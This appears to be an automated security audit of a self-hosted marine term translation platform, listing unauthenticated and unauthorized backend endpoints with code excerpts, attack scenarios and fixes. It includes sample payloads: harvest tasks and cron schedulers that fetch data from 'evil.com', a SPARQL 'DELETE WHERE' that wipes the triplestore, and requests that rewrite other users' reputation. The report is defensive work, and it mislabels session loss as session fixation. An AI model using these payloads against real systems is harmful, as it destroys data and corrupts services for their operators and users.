# Zero Trust Security Audit Report

**Date:** 2026-02-08  
**Platform:** Marine Term Translations Self-Host Platform  
**Auditor:** Security Analysis Agent  
**Focus:** Zero Trust Principle Violations

## Executive Summary

This security audit reveals **CRITICAL vulnerabilities** in the backend API that violate the zero trust principle. The backend relies heavily on frontend UI restrictions without implementing proper server-side authorization, allowing malicious users to bypass restrictions through direct API calls.

### Severity Breakdown
- **CRITICAL:** 5 vulnerabilities
- **HIGH:** 8 vulnerabilities  
- **MEDIUM:** 4 vulnerabilities
- **LOW:** 2 vulnerabilities

---

## Zero Trust Principle Overview

**Zero Trust Principle:** Never trust, always verify.

The backend should:
1. ✅ **Always authenticate** - Verify who is making the request
2. ❌ **Always authorize** - Verify the user has permission for the action (VIOLATED)
3. ❌ **Always validate** - Verify all input data (PARTIALLY VIOLATED)
4. ❌ **Never trust the client** - Don't rely on frontend restrictions (VIOLATED)

---

## Critical Vulnerabilities

### 🔴 CRITICAL-1: Unprotected User Reputation Manipulation
**File:** `backend/src/routes/terms.routes.js:815`  
**Endpoint:** `POST /api/user-reputation/:username`  
**Severity:** CRITICAL

**Issue:**
Any authenticated user can arbitrarily change ANY user's reputation score without authorization checks.

```javascript
router.post("/user-reputation/:username", writeLimiter, (req, res) => {
  const { username } = req.params;
  const { delta, reason, translation_id } = req.body;
  // NO AUTHORIZATION CHECK - ANY USER CAN MODIFY ANY USER'S REPUTATION
  if (typeof delta !== "number" || !reason) {
    return res.status(400).json({ error: "Missing delta or reason" });
  }
  const result = applyReputationChange(username, delta, reason, translation_id || null);
  // ...
});
```

**Attack Scenario:**
1. Attacker authenticates with ORCID
2. Attacker sends: `POST /api/user-reputation/admin_user` with `{delta: -1000000, reason: "malicious"}`
3. Admin user's reputation is destroyed
4. Attacker sends: `POST /api/user-reputation/attacker_user` with `{delta: 1000000, reason: "boost"}`
5. Attacker gains maximum reputation privileges

**Impact:**
- Complete corruption of the reputation system
- Privilege escalation
- Denial of service for legitimate users

**Fix Required:**
- Add `requireAdmin` middleware
- Log all reputation changes with admin user ID
- Implement rate limiting per user

---

### 🔴 CRITICAL-2: Unprotected Source Management
**File:** `backend/src/routes/sources.routes.js:229-274`  
**Endpoints:** 
- `POST /api/sources` (create)
- `PUT /api/sources/:id` (update)
- `DELETE /api/sources/:id` (delete)

**Severity:** CRITICAL

**Issue:**
Any unauthenticated user can create, modify, or delete data sources, including uploading malicious RDF files to GraphDB.

```javascript
router.post("/sources", writeLimiter, (req, res) => {
  // NO AUTHENTICATION CHECK AT ALL
  const { source_path, source_type, description } = req.body;
  // Creates source and auto-uploads to GraphDB
});

router.delete("/sources/:id", writeLimiter, async (req, res) => {
  // NO AUTHENTICATION CHECK
  // Deletes source, ALL associated terms, translations, and appeals
  // Also deletes from GraphDB triplestore
});
```

**Attack Scenario:**
1. Attacker (no authentication needed) creates malicious LDES source
2. Attacker uploads poisoned RDF data via `POST /api/sources/upload`
3. System automatically syncs malicious data to GraphDB
4. Attacker deletes legitimate sources, destroying all translations
5. Complete data loss and corruption

**Impact:**
- Complete data destruction
- GraphDB triplestore poisoning
- Loss of all translation work
- Supply chain attack via malicious RDF data

**Fix Required:**
- Add `requireAuth` middleware to ALL source endpoints
- Add `requireAdmin` middleware for create/update/delete operations
- Implement ownership/permissions model for sources
- Add audit logging

---

### 🔴 CRITICAL-3: Unprotected Task Manipulation
**File:** `backend/src/routes/tasks.routes.js:47-102, 147-215`  
**Endpoints:**
- `POST /api/tasks` (create)
- `PUT /api/tasks/:id` (update)
- `DELETE /api/tasks/:id` (cancel)

**Severity:** CRITICAL

**Issue:**
Any unauthenticated user can create, modify, or cancel background tasks (file uploads, LDES sync, harvest operations).

```javascript
router.post("/tasks", writeLimiter, (req, res) => {
  // NO AUTHENTICATION CHECK
  const { task_type, source_id, metadata, created_by } = req.body;
  // User can specify ANY created_by value - no validation
  // Can create malicious harvest/sync tasks
});

router.put("/tasks/:id", writeLimiter, (req, res) => {
  // NO AUTHENTICATION CHECK
  // User can update ANY task, change status, metadata
  // Can mark malicious tasks as 'completed'
});
```

**Attack Scenario:**
1. Attacker creates task: `{task_type: 'harvest', metadata: {collectionUri: 'http://evil.com/poison.ttl'}}`
2. System automatically processes malicious harvest
3. Attacker cancels legitimate running tasks
4. Denial of service for all background operations

**Impact:**
- Denial of service
- Resource exhaustion
- Malicious code execution via harvest
- Task queue poisoning

**Fix Required:**
- Add `requireAuth` middleware to all task endpoints
- Validate `created_by` matches authenticated user
- Add `requireAdmin` for manual task creation
- Implement task ownership checks

---

### 🔴 CRITICAL-4: Unprotected Task Scheduler Manipulation
**File:** `backend/src/routes/task-schedulers.routes.js`  
**Endpoints:**
- `POST /api/task-schedulers` (create)
- `PUT /api/task-schedulers/:id` (update)
- `DELETE /api/task-schedulers/:id` (delete)
- `POST /api/task-schedulers/:id/toggle` (enable/disable)

**Severity:** CRITICAL

**Issue:**
Any unauthenticated user can create, modify, or delete automated task schedulers.

**Attack Scenario:**
1. Attacker creates scheduler: `{schedule: '* * * * *', task_type: 'harvest', metadata: {url: 'http://evil.com'}}`
2. Malicious harvest runs every minute
3. Attacker disables all legitimate schedulers
4. System loses automated data sync capability

**Impact:**
- Persistent malicious code execution
- Denial of service
- Loss of automated workflows

**Fix Required:**
- Add `requireAdmin` middleware to ALL scheduler endpoints
- Validate cron expressions
- Add audit logging

---

### 🔴 CRITICAL-5: Unprotected Appeal Message Creation
**File:** `backend/src/routes/appeals.routes.js:331-387`  
**Endpoint:** `POST /api/appeals/:id/messages`

**Severity:** HIGH (escalated to CRITICAL when combined with other issues)

**Issue:**
While authentication is checked, authorization is NOT properly validated. Any authenticated user can post messages to ANY appeal.

```javascript
router.post("/appeals/:id/messages", writeLimiter, (req, res) => {
  // Authentication checked ✓
  if (!req.session.user) {
    return res.status(401).json({ error: "Not authenticated" });
  }
  
  // But NO check if user is:
  // 1. The appeal opener
  // 2. An admin/moderator
  // 3. Involved in the translation
  
  // ANY authenticated user can spam ANY appeal
});
```

**Attack Scenario:**
1. Attacker creates multiple ORCID accounts
2. Attacker floods all active appeals with spam messages
3. Legitimate discussions become unusable
4. Moderation system overwhelmed

**Impact:**
- Spam/harassment
- Denial of service for moderation
- Destruction of community trust

**Fix Required:**
- Verify user is appeal participant (opener, translation author, or admin)
- Add rate limiting per user per appeal
- Implement spam detection

---

## High Severity Vulnerabilities

### 🟠 HIGH-1: Missing Ownership Validation in Appeal Creation
**File:** `backend/src/routes/appeals.routes.js:33-69`  
**Endpoint:** `POST /api/appeals`  
**Severity:** HIGH

**Issue:**
User can specify ANY `opened_by` username, but validation only checks if that user exists and matches the authenticated user. However, a user could create an appeal claiming to be opened by another user.

```javascript
router.post("/appeals", writeLimiter, (req, res) => {
  const { translation_id, opened_by, resolution } = req.body;
  
  const currentUserId = req.session.user.id || req.session.user.user_id;
  const openedByUser = db.prepare("SELECT id FROM users WHERE username = ? OR id = ?")
    .get(opened_by, parseInt(opened_by) || 0);
  
  // Check exists, but user supplies opened_by - why accept it from client?
  if (!openedByUser || openedByUser.id !== currentUserId) {
    return res.status(403).json({ error: "User mismatch" });
  }
  // Should just use req.session.user.id directly
});
```

**Fix Required:**
- Remove `opened_by` from request body
- Use `req.session.user.id` directly

---

### 🟠 HIGH-2: Missing Authorization for Appeal Updates
**File:** `backend/src/routes/appeals.routes.js:177-214`  
**Endpoint:** `PATCH /api/appeals/:id`

**Issue:**
Similar to creation - accepts `username` from request body instead of using session. Any authenticated user can update any appeal if they know the username of the appeal owner.

**Fix Required:**
- Remove `username` from request body
- Verify user is appeal owner or admin before allowing updates

---

### 🟠 HIGH-3: Unprotected Flow Endpoints
**File:** `backend/src/routes/flow.routes.js`  
**Endpoints:**
- `POST /api/flow/start`
- `GET /api/flow/next`
- `POST /api/flow/review`
- `POST /api/flow/session/end`

**Issue:**
Flow endpoints have swagger docs claiming authentication required but NO middleware enforcement. Users can manipulate translation flow without authentication.

**Fix Required:**
- Add `requireAuth` middleware to all flow endpoints
- Validate session ownership

---

### 🟠 HIGH-4: No Input Validation on SPARQL Queries
**File:** `backend/src/routes/sparql.routes.js`  
**Endpoints:**
- `POST /api/sparql/execute`
- `POST /api/sparql/custom`

**Issue:**
Users can execute arbitrary SPARQL queries against GraphDB without authentication or query validation.

**Attack Scenario:**
1. Attacker executes `DELETE WHERE {?s ?p ?o}` 
2. Entire triplestore wiped

**Fix Required:**
- Add `requireAuth` middleware
- Add query validation/sanitization
- Implement read-only mode for non-admin users
- Add `requireAdmin` for write operations

---

### 🟠 HIGH-5: Missing Resource Ownership Validation
**File:** `backend/src/routes/source-detail.routes.js:643-690`  
**Endpoint:** `PUT /api/sources/:id/config`

**Issue:**
Any unauthenticated user can modify source configuration.

**Fix Required:**
- Add `requireAuth` or `requireAdmin` middleware

---

### 🟠 HIGH-6: Unprotected Source Sync
**File:** `backend/src/routes/source-detail.routes.js`  
**Endpoint:** `POST /api/sources/:id/sync-terms`

**Issue:**
Any unauthenticated user can trigger term synchronization for any source.

**Fix Required:**
- Add `requireAuth` middleware
- Add rate limiting per source

---

### 🟠 HIGH-7: Missing Authentication on Harvest Endpoint
**File:** `backend/src/routes/terms.routes.js`  
**Endpoint:** `POST /api/harvest`

**Issue:**
While `/api/harvest/stream` requires authentication, the basic `/api/harvest` endpoint might not (need to verify).

**Fix Required:**
- Ensure ALL harvest endpoints require authentication
- Add `requireAdmin` for production harvests

---

### 🟠 HIGH-8: Unprotected File Upload
**File:** `backend/src/routes/sources.routes.js:740-824`  
**Endpoint:** `POST /api/sources/upload`

**Issue:**
Any unauthenticated user can upload 100MB RDF files to the server and GraphDB.

```javascript
router.post("/sources/upload", writeLimiter, upload.single('file'), async (req, res) => {
  // NO AUTHENTICATION CHECK
  // Accepts files up to 100MB
  // Uploads to /data/uploads
  // Automatically syncs to GraphDB
  // Creates background task
});
```

**Attack Scenario:**
1. Attacker uploads malicious 100MB RDF file
2. Repeats 100 times in 15 minutes (rate limit)
3. 10GB of malicious data uploaded
4. GraphDB and disk space exhausted
5. Denial of service

**Fix Required:**
- Add `requireAuth` middleware
- Consider `requireAdmin` for production
- Reduce file size limit
- Implement per-user quotas
- Scan uploaded files for malicious content

---

## Medium Severity Vulnerabilities

### 🟡 MEDIUM-1: Session Fixation Risk
**File:** `backend/src/app.js:40-56`

**Issue:**
Session configuration uses memory store which doesn't persist across restarts. All sessions lost on restart.

**Fix Required:**
- Use persistent session store (Redis, database)
- Implement session rotation

---

### 🟡 MEDIUM-2: Missing Rate Limiting Differentiation
**File:** `backend/src/middleware/rateLimit.js`

**Issue:**
Rate limiting is global, not per-user. A single malicious user can exhaust the global rate limit, denying service to all users.

**Fix Required:**
- Implement per-user rate limiting
- Implement per-IP rate limiting
- Add stricter limits for write operations

---

### 🟡 MEDIUM-3: No CSRF Protection
**File:** `backend/src/app.js`

**Issue:**
While ORCID OAuth flow uses state parameter for CSRF protection, the API endpoints don't implement CSRF tokens.

**Fix Required:**
- Implement CSRF tokens for state-changing operations
- Use double-submit cookie pattern

---

### 🟡 MEDIUM-4: Insufficient Logging
**Issue:**
Many sensitive operations (source deletion, task creation, reputation changes) don't have adequate audit logging.

**Fix Required:**
- Implement comprehensive audit logging
- Log all admin actions
- Log all failed authorization attempts
- Include IP address, user ID, timestamp

---

## Low Severity Issues

### 🟢 LOW-1: Missing Input Sanitization
Many endpoints accept user input without sanitization (SQL injection risk mitigated by parameterized queries, but XSS possible).

### 🟢 LOW-2: Overly Permissive CORS
CORS is configured for single frontend URL, but could be more restrictive.

---

## Recommendations Summary

### Immediate Actions (Critical - Fix within 24 hours)

1. **Add requireAdmin middleware** to:
   - `/api/user-reputation/:username` (POST)
   - All `/api/sources/*` write endpoints
   - All `/api/tasks/*` write endpoints
   - All `/api/task-schedulers/*` endpoints
   - All SPARQL write endpoints

2. **Add requireAuth middleware** to:
   - All `/api/flow/*` endpoints
   - `/api/sources/upload`
   - `/api/harvest` endpoints

3. **Remove client-controlled identity fields**:
   - Remove `opened_by` from appeal creation
   - Remove `username` from appeal updates
   - Remove `created_by` from task creation
   - Always use `req.session.user.id`

### Short-term Actions (High - Fix within 1 week)

4. **Implement ownership validation**:
   - Verify users can only modify their own resources
   - Add admin override capability
   - Log all ownership checks

5. **Add resource-level authorization**:
   - Users can only update/delete their own sources
   - Users can only participate in relevant appeals
   - Implement role-based access control (RBAC)

6. **Implement comprehensive audit logging**:
   - Log all admin actions
   - Log all failed authorization attempts
   - Log sensitive operations (reputation changes, deletions)

### Medium-term Actions (Medium - Fix within 1 month)

7. **Enhance input validation**:
   - Validate all user input
   - Sanitize for XSS
   - Implement request schema validation

8. **Improve session management**:
   - Use persistent session store
   - Implement session rotation
   - Add session timeout

9. **Implement CSRF protection**:
   - Add CSRF tokens to all state-changing endpoints
   - Validate CSRF tokens in middleware

### Long-term Actions (Low - Fix within 3 months)

10. **Security hardening**:
    - Implement per-user rate limiting
    - Add API key authentication option
    - Implement request signing
    - Add security headers

11. **Monitoring and alerting**:
    - Monitor for suspicious activity
    - Alert on failed authorization
    - Track reputation manipulation attempts

---

## Testing Recommendations

1. **Create automated security tests**:
   - Test each vulnerability with actual HTTP requests
   - Verify fixes prevent exploitation
   - Add to CI/CD pipeline

2. **Penetration testing**:
   - Hire security firm for professional audit
   - Test in isolated environment
   - Document all findings

3. **Regular security audits**:
   - Quarterly code reviews
   - Monthly dependency updates
   - Annual penetration testing

---

## Conclusion

This platform has **severe zero trust violations** that allow malicious users to:
- Destroy all data
- Manipulate reputation system
- Execute persistent malicious code
- Deny service to legitimate users

**The backend trusts the frontend entirely and performs minimal authorization checks.**

All critical vulnerabilities must be fixed immediately before this platform can be considered secure for production use.

---

## Appendix: Zero Trust Best Practices

### ✅ What the Backend Should Do

1. **Never trust client data**
   - Validate all input
   - Sanitize for security
   - Use server-side session for identity

2. **Always verify permissions**
   - Check authentication on EVERY endpoint
   - Check authorization for EVERY action
   - Implement ownership validation

3. **Log everything**
   - Audit all sensitive operations
   - Track failed authorization attempts
   - Monitor for suspicious patterns

4. **Fail securely**
   - Default deny
   - Clear error messages (no information disclosure)
   - Graceful degradation

### ❌ What the Backend Should NOT Do

1. **Don't trust frontend validation**
   - Frontend can be bypassed
   - Always validate server-side

2. **Don't accept identity from client**
   - Don't trust `opened_by`, `username`, `created_by` from request
   - Use `req.session.user.id` instead

3. **Don't skip authorization**
   - Authentication ≠ Authorization
   - Just because user is logged in doesn't mean they can do everything

4. **Don't rely on rate limiting for security**
   - Rate limiting is for availability, not security
   - Still need proper authorization

---

**Report Generated:** 2026-02-08  
**Next Review:** After fixes implemented
